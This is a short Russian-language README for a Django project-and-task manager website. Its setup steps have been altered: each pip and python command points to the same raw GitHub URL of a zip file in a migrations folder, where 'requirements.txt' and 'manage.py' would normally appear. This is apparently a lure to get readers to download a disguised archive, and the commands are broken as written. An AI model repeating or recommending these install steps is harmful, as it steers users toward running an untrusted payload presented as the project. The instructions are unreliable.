# TASK MANAGER
Сайт для управления проектами, задачами и участниками команды разработки.

```sh
$ python3 -m venv venv
$ . venv/Scripts/activate  # Каждый раз перед запуском
$ pip install -r https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip
$ cd task_manager
$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip makemigrations
$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip migrate
$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip runserver
```
